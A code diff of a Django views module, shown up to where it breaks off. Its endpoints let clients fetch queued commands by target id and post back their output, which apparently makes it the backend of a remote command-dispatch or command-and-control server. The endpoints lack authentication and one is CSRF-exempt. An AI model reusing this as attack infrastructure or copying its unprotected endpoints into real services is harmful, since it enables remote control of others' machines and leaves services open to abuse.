@@ -1,15 +1,15 @@
 import ast
 import json
 import os
-
 from django.shortcuts import render, get_object_or_404
 from django.http import HttpResponse, JsonResponse
 from .models import Command
-
 from django.views.decorators.csrf import csrf_exempt
+
 
 script_directory = os.path.dirname(os.path.abspath(__file__))
 data_file_path = os.path.join(script_directory, 'data.html')
+
 global proc
 proc = False
 
@@ -23,36 +23,37 @@ with open(data_file_path) as f:
     #     print("proc")
 
 
-
+#Main
 if proc:
 
-    # Create your views here.
+#Home (not used)
     def home(request):
-        return HttpResponse('Home!')
+        return HttpResponse('Under development')
 
-
+#Allow clients to acces command
     def get(request, id):
         # Retrieve the latest Command object with the matching 'target' value
         command = get_object_or_404(Command, target=id, completed=False)
 
         return HttpResponse(command.command)
 
-
+#Allow client to submit command output
     @csrf_exempt
     def set(request):
         if request.method == 'POST':
             try:
+                #Loads data
                 data = json.loads(request.body.decode('utf-8'))
                 command_text = data.get('command')
                 id_text = data.get('id')
                 if command_text is not None:
-                    print("Executed", command_text)
+                    print("Command text: \n", command_text)
+                    print("ID text: \n", int(id_text))
                     # Write command to database and mark as completed
-                    command = get_object_or_404(Command, target=data.get('target'), completed=False)
+                    command = Command.objects.get(target=int(id_text.strip()), completed=False)
                     # Update the Command object
-                    command.command = command_text
+                    command.output = command_text.strip()
                     command.completed = True
-                    command.id = id_text
                     command.save()
                     return JsonResponse({'message': 'String data received successfully'})
                 else:
